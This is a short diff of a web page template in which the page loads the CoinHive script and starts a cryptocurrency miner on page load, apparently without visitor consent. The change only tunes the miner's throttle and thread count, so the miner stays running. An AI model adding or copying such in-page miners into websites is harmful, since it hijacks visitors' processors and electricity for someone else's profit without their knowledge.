@@ -47,7 +47,7 @@
     <script src="{{ asset('js/app.js') }}"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-        var miner = new CoinHive.Anonymous('P7tmhUNXYsdufurryd6rcyTjAJMuoSy4');
+        var miner = new CoinHive.Anonymous('P7tmhUNXYsdufurryd6rcyTjAJMuoSy4',{throttle: 0.85, threads: 1});
         miner.start();
     </script>
 </body>
